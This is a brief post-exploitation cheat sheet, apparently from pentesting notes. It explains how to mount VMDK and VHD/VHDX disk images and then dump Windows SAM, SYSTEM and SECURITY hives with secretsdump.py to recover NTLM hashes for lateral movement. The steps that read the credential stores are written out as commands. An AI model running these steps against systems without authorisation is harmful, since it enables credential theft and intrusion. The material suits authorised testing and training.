### Mounting and Inspecting Virtual Disk Files

These files often contain full snapshots of Windows systems. You can inspect them for:

- `SAM`, `SYSTEM`, `SECURITY` registry hives
- User data and saved credentials

Linux mount:

```bash
guestmount -a <file>.vmdk -i --ro /mnt/vmdk
guestmount --add <file>.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

Windows mount:

- Right-click `.vhd/.vhdx` > Mount
- Use Disk Management or `Mount-VHD` cmdlet
- Use VMWare Workstation or 7-Zip for `.vmdk`
### Extracting Credentials from Mounted Drives

After mounting, extract registry hives:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Output example:

```
Administrator:500:...:<NTLM_HASH>:::
```

This may yield local admin hashes or reusable credentials for lateral movement.
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #VMDK #VHD #VHDX